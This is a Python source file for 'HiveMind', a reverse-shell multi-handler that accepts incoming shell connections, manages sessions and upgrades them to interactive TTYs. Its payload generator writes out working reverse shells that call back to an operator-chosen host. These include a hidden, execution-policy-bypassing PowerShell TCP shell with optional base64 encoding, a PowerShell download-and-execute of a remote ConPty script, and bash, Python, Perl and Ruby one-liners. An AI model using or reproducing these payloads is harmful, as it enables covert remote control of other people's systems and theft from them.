#!/usr/bin/env python3
import socket
import threading
import os
import sys
import select
import netifaces
import subprocess
import base64
import time
import readline  # For tab autocomplete and history
from termcolor import colored
import pyperclip  # For copying output to clipboard

# Global default port for all reverse shells
DEFAULT_PORT = 4444
# Global heartbeat timeout (in seconds) before considering a session dead.
HEARTBEAT_TIMEOUT = 300  # 5 minutes

# Global event that will be set when the listener thread has printed its startup message.
listener_ready = threading.Event()

# --- Enhanced Payload Types ---
PAYLOAD_TYPES = [
    "windows/reverse_tcp/powershell",
    "windows/conpty",
    "linux/reverse_tcp/bash",
    "linux/reverse_tcp/python",
    "linux/reverse_tcp/perl",
    "linux/reverse_tcp/ruby"
]

# Command list now includes the new "clear" command.
COMMANDS = [
    'alias', 'cleanup', 'cmd', 'clear', 'exit', 'help',
    'kill', 'session', 'sessions', 'set payload', 'show payloads', 'upgrade'
]

# --- Global Structures for Sessions ---
class Session:
    def __init__(self, session_id, conn, addr):
        self.session_id = session_id
        self.conn = conn
        self.addr = addr
        self.last_heartbeat = time.time()  # Timestamp of last activity

# sessions: mapping session_id (int) -> Session object
sessions = {}
# session_aliases: mapping alias (str) -> session_id (int)
session_aliases = {}
lock = threading.Lock()  # For synchronizing access to sessions and aliases

# --- Helper for synchronized printing ---
print_lock = threading.Lock()
def safe_print(*args, **kwargs):
    with print_lock:
        print(*args, **kwargs)

# --- Utility Functions ---
def color(text, color_code):
    """Wraps the given text with ANSI escape codes for the provided color code."""
    return f"\033[{color_code}m{text}\033[0m"

def banner():
    # Original banner as requested.
    banner_text = color(
        """
    ██╗  ██╗██╗██╗   ██╗███████╗███╗   ███╗██╗███╗   ██╗██████╗ 
    ██║  ██║██║██║   ██║██╔════╝████╗ ████║██║████╗  ██║██╔══██╗
    ███████║██║██║   ██║█████╗  ██╔████╔██║██║██╔██╗ ██║██║  ██║
    ██╔══██║██║╚██╗ ██╔╝██╔══╝  ██║╚██╔╝██║██║██║╚██╗██║██║  ██║
    ██║  ██║██║ ╚████╔╝ ███████╗██║ ╚═╝ ██║██║██║ ╚████║██████╔╝
    ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═════╝ 
        """, "96"
    )
    safe_print(banner_text, flush=True)
    safe_print(colored("[Info]", "green"), "Reverse Shell Multi-Handler Initialized.", flush=True)
    safe_print(colored("[Info]", "green"), "Type 'help' to list available commands.\n", flush=True)

def show_help():
    safe_print(colored("\n[ HiveMind Commands ]", "yellow"), flush=True)
    safe_print(colored("  alias <id|alias> <new_alias>         - Set an alias for a session", "green"), flush=True)
    safe_print(colored("  cleanup                              - Manually clean up dead sessions", "green"), flush=True)
    safe_print(colored("  cmd <command>                        - Execute a local shell command", "green"), flush=True)
    safe_print(colored("  clear                                - Clear the screen and reprint the header", "green"), flush=True)
    safe_print(colored("  exit                                 - Exit HiveMind", "green"), flush=True)
    safe_print(colored("  help                                 - Show this help menu", "green"), flush=True)
    safe_print(colored("  kill <id|alias>                      - Kill a session", "green"), flush=True)
    safe_print(colored("  session <id|alias>                   - Interact with a specific session (basic mode)", "green"), flush=True)
    safe_print(colored("  sessions                             - Show all active sessions", "green"), flush=True)
    safe_print(colored("  set payload <Type> <LHOST> [base64]  - Set payload (no port required)", "green"), flush=True)
    safe_print(colored("  show payloads                        - List available payloads", "green"), flush=True)
    safe_print(colored("  upgrade <id|alias>                   - Upgrade session to full TTY mode", "green"), flush=True)
    safe_print("", flush=True)

def list_payloads():
    safe_print(colored("\n[ Available Payloads ]", "blue"), flush=True)
    safe_print(colored("  windows/reverse_tcp/powershell  - Standard PowerShell Reverse Shell", "green"), flush=True)
    safe_print(colored("  windows/conpty                  - ConPty-based Reverse Shell (use upgrade)", "green"), flush=True)
    safe_print(colored("  linux/reverse_tcp/bash          - Bash Reverse Shell", "green"), flush=True)
    safe_print(colored("  linux/reverse_tcp/python        - Python Reverse Shell", "green"), flush=True)
    safe_print(colored("  linux/reverse_tcp/perl          - Perl Reverse Shell", "green"), flush=True)
    safe_print(colored("  linux/reverse_tcp/ruby          - Ruby Reverse Shell\n", "green"), flush=True)

def resolve_ip(lhost):
    if lhost in netifaces.interfaces():
        addrs = netifaces.ifaddresses(lhost)
        if netifaces.AF_INET in addrs and addrs[netifaces.AF_INET]:
            return addrs[netifaces.AF_INET][0]['addr']
        else:
            safe_print(colored(f"[-] No IPv4 address found for interface {lhost}. Using input as is.", "red"), flush=True)
            return lhost
    try:
        socket.inet_aton(lhost)
        return lhost
    except socket.error:
        try:
            return socket.gethostbyname(lhost)
        except Exception as e:
            safe_print(colored(f"[-] Failed to resolve {lhost}: {e}. Using input as is.", "red"), flush=True)
            return lhost

def generate_payload(payload_type, lhost, encode=False):
    resolved_host = resolve_ip(lhost)
    
    if payload_type == "windows/conpty":
        # Run 'stty size' to obtain terminal rows and columns.
        try:
            size_output = subprocess.check_output(["stty", "size"], text=True).strip()
            rows, cols = size_output.split()
        except Exception as e:
            safe_print(colored(f"[-] Failed to obtain terminal size: {e}. Using default values.", "red"), flush=True)
            rows, cols = "24", "80"
        payload = (
            f"powershell -nop -W hidden -noni -ep bypass -c \"IEX((New-Object Net.WebClient).DownloadString('http://{resolved_host}/Invoke-ConPtyShell.ps1')); "
            f"Invoke-ConPtyShell {resolved_host} {DEFAULT_PORT} -Rows {rows} -Cols {cols}\""
        )
    elif payload_type == "windows/reverse_tcp/powershell":
        script_body = (
            f"$TCPClient = New-Object Net.Sockets.TCPClient('{resolved_host}', {DEFAULT_PORT});"
            f"$NetworkStream = $TCPClient.GetStream();"
            f"$StreamWriter = New-Object IO.StreamWriter($NetworkStream);"
            f"function WriteToStream ($String) "
            f"{{[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}}; "
            f"$StreamWriter.Write($String + 'SHELL> '); "
            f"$StreamWriter.Flush()}}; "
            f"WriteToStream ''; "
            f"while(($BytesRead = $NetworkStream.Read($script:Buffer, 0, $script:Buffer.Length)) -gt 0) "
            f"{{ $Command = ([text.encoding]::UTF8).GetString($script:Buffer, 0, $BytesRead - 1); "
            f"if ($Command -ne '') {{ $Output = try {{ Invoke-Expression $Command 2>&1 | Out-String -Width 4096 }} catch {{ $_ | Out-String -Width 4096 }}; "
            f"WriteToStream ($Output) }} }}; "
            f"$StreamWriter.Close()"
        )
        if encode:
            encoded_payload = base64.b64encode(script_body.encode('utf-16le')).decode()
            return f"powershell -e {encoded_payload}"
        else:
            payload = f"powershell -nop -W hidden -noni -ep bypass -c \"{script_body}\""
    elif payload_type == "linux/reverse_tcp/bash":
        payload = f"bash -i >& /dev/tcp/{resolved_host}/{DEFAULT_PORT} 0>&1"
    elif payload_type == "linux/reverse_tcp/python":
        payload = (
            f"python -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{resolved_host}\",{DEFAULT_PORT}));"
            f"os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
            f"p=subprocess.call([\"/bin/sh\",\"-i\"])'"
        )
    elif payload_type == "linux/reverse_tcp/perl":
        payload = (
            f"perl -e 'use Socket;$i=\"{resolved_host}\";$p={DEFAULT_PORT};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
            f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
            f"exec(\"/bin/sh -i\");}};'"
        )
    elif payload_type == "linux/reverse_tcp/ruby":
        payload = (
            f"ruby -rsocket -e 'f=TCPSocket.new(\"{resolved_host}\",{DEFAULT_PORT});"
            f"while(cmd=f.gets); IO.popen(cmd,\"r\"){{|io| f.print io.read}} end'"
        )
    else:
        return "Invalid payload type."
    
    return payload

# --- Networking Functions ---
def start_listener(port):
    """
    Listens on the given port and spawns a new thread for each incoming connection.
    Handshake functionality has been removed so that each connection is treated as a new session.
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server.bind(("0.0.0.0", port))
        server.listen(10)
        safe_print(colored(f"[+] HiveMind is listening for incoming shells on port {port}...\n", "yellow"), flush=True)
        listener_ready.set()  # Signal that the listener's startup message has been printed.
    except Exception as e:
        safe_print(colored(f"[-] Failed to start listener on port {port}: {e}", "red"), flush=True)
        sys.exit(1)
    
    global_session_counter = 1
    while True:
        try:
            conn, addr = server.accept()
            with lock:
                session_obj = Session(global_session_counter, conn, addr)
                sessions[global_session_counter] = session_obj
                safe_print(colored(f"[+] Session {global_session_counter} established from {addr}", "green"), flush=True)
                global_session_counter += 1
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
        except Exception as e:
            safe_print(colored(f"[-] Error accepting connection: {e}", "red"), flush=True)

def remove_session(session_id):
    """Helper function to remove a session and its alias (if any)."""
    with lock:
        if session_id in sessions:
            try:
                sessions[session_id].conn.close()
            except Exception:
                pass
            del sessions[session_id]
        for alias, sid in list(session_aliases.items()):
            if sid == session_id:
                del session_aliases[alias]

def resolve_session_identifier(identifier):
    """
    Resolves an identifier (numeric string or alias) to a session id.
    Returns an integer session id if found, otherwise None.
    """
    with lock:
        if identifier.isdigit():
            sid = int(identifier)
            if sid in sessions:
                return sid
        elif identifier in session_aliases:
            sid = session_aliases[identifier]
            if sid in sessions:
                return sid
            else:
                del session_aliases[identifier]
    return None

def kill_session(identifier):
    """Kills a session by id or alias."""
    sid = resolve_session_identifier(identifier)
    if sid is None:
        safe_print(colored(f"[-] No active session matching '{identifier}'.", "red"), flush=True)
    else:
        remove_session(sid)
        safe_print(colored(f"[*] Session {sid} has been terminated.", "yellow"), flush=True)

# This function currently serves as a placeholder for any background handling.
def handle_client(conn, addr):
    pass

# --- Session Handling Functions ---
def interactive_shell(session_id):
    with lock:
        if session_id not in sessions:
            safe_print(colored(f"[-] No active session {session_id}", "red"), flush=True)
            return
        session = sessions[session_id]
    safe_print(colored(f"\n[*] Switched to session {session_id}. Press Ctrl+C to return to HiveMind menu.\n", "yellow"), flush=True)
    try:
        while True:
            r, _, _ = select.select([session.conn, sys.stdin], [], [])
            if session.conn in r:
                try:
                    data = session.conn.recv(4096)
                except Exception as e:
                    safe_print(colored(f"[-] Error receiving data: {e}", "red"), flush=True)
                    remove_session(session_id)
                    break
                if not data:
                    safe_print(colored("[-] Connection closed by remote host.", "red"), flush=True)
                    remove_session(session_id)
                    break
                session.last_heartbeat = time.time()
                safe_print(data.decode(errors="ignore"), end="", flush=True)
            if sys.stdin in r:
                cmd = input(colored("", "cyan"))
                try:
                    session.conn.send((cmd + "\n").encode())
                except Exception as e:
                    safe_print(colored(f"[-] Error sending data: {e}", "red"), flush=True)
                    break
    except KeyboardInterrupt:
        safe_print(colored("\n[*] Returning to HiveMind menu...\n", "yellow"), flush=True)
    except Exception as e:
        safe_print(colored(f"[-] Session {session_id} lost: {e}", "red"), flush=True)
        remove_session(session_id)

def upgrade_session(session_id):
    """
    Upgrades the selected session to a full interactive TTY mode.
    Note: Full TTY upgrade may not work properly with some reverse shells.
    """
    with lock:
        if session_id not in sessions:
            safe_print(colored(f"[-] No active session {session_id}", "red"), flush=True)
            return
        session = sessions[session_id]
    import tty, termios
    old_tty = termios.tcgetattr(sys.stdin)
    safe_print(colored(f"\n[*] Upgrading session {session_id} to TTY mode. Press Ctrl+] to exit TTY mode.\n", "yellow"), flush=True)
    safe_print(colored("[*] Note: Full TTY upgrade may not work with certain reverse shells.", "yellow"), flush=True)
    try:
        tty.setraw(sys.stdin.fileno())
        while True:
            r, _, _ = select.select([session.conn, sys.stdin], [], [], 0.1)
            if session.conn in r:
                try:
                    data = session.conn.recv(1024)
                except Exception as e:
                    safe_print(colored(f"[-] Error receiving data: {e}", "red"), flush=True)
                    break
                if not data:
                    break
                os.write(sys.stdout.fileno(), data)
                session.last_heartbeat = time.time()
            if sys.stdin in r:
                data = os.read(sys.stdin.fileno(), 1024)
                if not data:
                    break
                if b'\x1d' in data:  # Ctrl+]
                    break
                try:
                    session.conn.send(data)
                except Exception as e:
                    safe_print(colored(f"[-] Error sending data: {e}", "red"), flush=True)
                    break
    except Exception as e:
        safe_print(colored(f"[-] Session {session_id} upgrade failed: {e}", "red"), flush=True)
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
        safe_print(colored(f"\n[*] Exiting TTY mode for session {session_id}.", "yellow"), flush=True)

def list_sessions():
    safe_print(colored("\n[ Active Sessions ]", "blue"), flush=True)
    with lock:
        if not sessions:
            safe_print(colored("[-] No active sessions.", "red"), flush=True)
        else:
            for sid, session in sessions.items():
                try:
                    peer = session.addr
                    alias_str = ""
                    for alias, asid in session_aliases.items():
                        if asid == sid:
                            alias_str = f" (alias: {alias})"
                            break
                    safe_print(colored(f"Session {sid}{alias_str}: {peer[0]}:{peer[1]}", "green"), flush=True)
                except Exception:
                    safe_print(colored(f"Session {sid}: [Disconnected]", "red"), flush=True)
    safe_print("", flush=True)

def cleanup_sessions():
    """Manually removes any sessions that are no longer active or have timed out."""
    removed = 0
    now = time.time()
    with lock:
        for sid, session in list(sessions.items()):
            # If no activity for more than HEARTBEAT_TIMEOUT seconds, consider the session dead.
            if now - session.last_heartbeat > HEARTBEAT_TIMEOUT:
                try:
                    session.conn.close()
                except Exception:
                    pass
                del sessions[sid]
                removed += 1
    if removed:
        safe_print(colored(f"[*] Cleanup: Removed {removed} dead session(s).", "yellow"), flush=True)

# --- Enhanced Autocompletion ---
def completer(text, state):
    """
    Custom completer function.
    
    For the "set payload" command, it offers specific completions.
    For commands like "session", "kill", "upgrade", and "alias", it dynamically completes with active session IDs and aliases.
    Otherwise, it completes from the COMMANDS list.
    """
    buffer = readline.get_line_buffer()
    tokens = buffer.split()
    if buffer.endswith(" "):
        current_token_index = len(tokens)
    else:
        current_token_index = len(tokens) - 1

    if tokens and tokens[0].lower() == "set" and len(tokens) >= 2 and tokens[1].lower() == "payload":
        if current_token_index == 2:
            options = [p for p in PAYLOAD_TYPES if p.startswith(text)]
            if state < len(options):
                return options[state]
            return None
        elif current_token_index == 3:
            interfaces = netifaces.interfaces()
            options = [iface for iface in interfaces if iface.startswith(text)]
            if state < len(options):
                return options[state]
            return None
        elif current_token_index == 4:
            ENCODING_OPTIONS = ["base64"]
            options = [opt for opt in ENCODING_OPTIONS if opt.startswith(text)]
            if state < len(options):
                return options[state]
            return None
        else:
            return None
    elif tokens and tokens[0].lower() in ["session", "kill", "upgrade", "alias"]:
        if current_token_index == 1:
            with lock:
                dynamic_options = list(map(str, sessions.keys())) + list(session_aliases.keys())
            options = [opt for opt in dynamic_options if opt.startswith(text)]
            if state < len(options):
                return options[state]
            return None
    else:
        options = [cmd for cmd in COMMANDS if cmd.startswith(text)]
        if state < len(options):
            return options[state]
        return None

readline.set_completer(completer)
readline.parse_and_bind("tab: complete")
readline.set_completer_delims(" \t\n")

# --- Command-Line Interface ---
def command_line():
    while True:
        try:
            cmd = input(colored("HiveMind > ", "cyan")).strip()
        except EOFError:
            break  # Exit on Ctrl+D
        lower_cmd = cmd.lower()
        parts = cmd.split()

        if lower_cmd == "sessions":
            list_sessions()

        elif lower_cmd == "clear":
            os.system('cls' if os.name == 'nt' else 'clear')
            banner()

        elif lower_cmd.startswith("session "):
            if len(parts) < 2:
                safe_print(colored("[-] Usage: session <id|alias>", "red"), flush=True)
                continue
            identifier = parts[1]
            sid = resolve_session_identifier(identifier)
            if sid is None:
                safe_print(colored(f"[-] No active session matching '{identifier}'.", "red"), flush=True)
            else:
                interactive_shell(sid)

        elif lower_cmd.startswith("upgrade "):
            if len(parts) < 2:
                safe_print(colored("[-] Usage: upgrade <id|alias>", "red"), flush=True)
                continue
            identifier = parts[1]
            sid = resolve_session_identifier(identifier)
            if sid is None:
                safe_print(colored(f"[-] No active session matching '{identifier}'.", "red"), flush=True)
            else:
                upgrade_session(sid)

        elif lower_cmd.startswith("alias "):
            if len(parts) != 3:
                safe_print(colored("[-] Usage: alias <id|alias> <new_alias>", "red"), flush=True)
                continue
            identifier = parts[1]
            new_alias = parts[2]
            sid = resolve_session_identifier(identifier)
            if sid is None:
                safe_print(colored(f"[-] No active session matching '{identifier}'.", "red"), flush=True)
            else:
                with lock:
                    if new_alias in session_aliases:
                        safe_print(colored(f"[-] Alias '{new_alias}' is already in use.", "red"), flush=True)
                    else:
                        session_aliases[new_alias] = sid
                        safe_print(colored(f"[*] Session {sid} now has alias '{new_alias}'.", "yellow"), flush=True)

        elif lower_cmd.startswith("kill "):
            if len(parts) != 2:
                safe_print(colored("[-] Usage: kill <id|alias>", "red"), flush=True)
                continue
            identifier = parts[1]
            kill_session(identifier)

        elif lower_cmd == "cleanup":
            cleanup_sessions()

        elif lower_cmd.startswith("set payload"):
            if len(parts) < 4:
                safe_print(colored("[-] Usage: set payload <PayloadType> <LHOST> [base64]", "red"), flush=True)
                continue
            payload_type = parts[2]
            lhost = parts[3]
            encode = False
            if len(parts) > 4 and parts[4].lower() == "base64":
                encode = True
            generated = generate_payload(payload_type, lhost, encode)
            safe_print(colored("\n[+] Generated Payload:", "yellow"), flush=True)
            safe_print(generated + "\n", flush=True)
            try:
                pyperclip.copy(generated)
                safe_print(colored("[*] Payload copied to clipboard.", "green"), flush=True)
            except Exception as e:
                safe_print(colored(f"[-] Could not copy payload to clipboard: {e}", "red"), flush=True)

        elif lower_cmd == "show payloads":
            list_payloads()

        elif lower_cmd.startswith("cmd "):
            local_command = cmd[4:]
            try:
                result = subprocess.run(local_command, shell=True, capture_output=True, text=True)
                if result.stdout:
                    safe_print(result.stdout, flush=True)
                if result.stderr:
                    safe_print(result.stderr, flush=True)
            except Exception as e:
                safe_print(colored(f"[-] Error executing command: {e}", "red"), flush=True)

        elif lower_cmd == "exit":
            safe_print(colored("[*] Exiting HiveMind...", "yellow"), flush=True)
            with lock:
                for sid in list(sessions.keys()):
                    remove_session(sid)
            break

        elif lower_cmd == "help":
            show_help()

        else:
            safe_print(colored("[-] Unknown command.", "red"), flush=True)

if __name__ == "__main__":
    banner()
    listener_thread = threading.Thread(target=lambda: start_listener(DEFAULT_PORT), daemon=True)
    listener_thread.start()
    listener_ready.wait()  # Wait until the listener has printed its startup message.
    command_line()
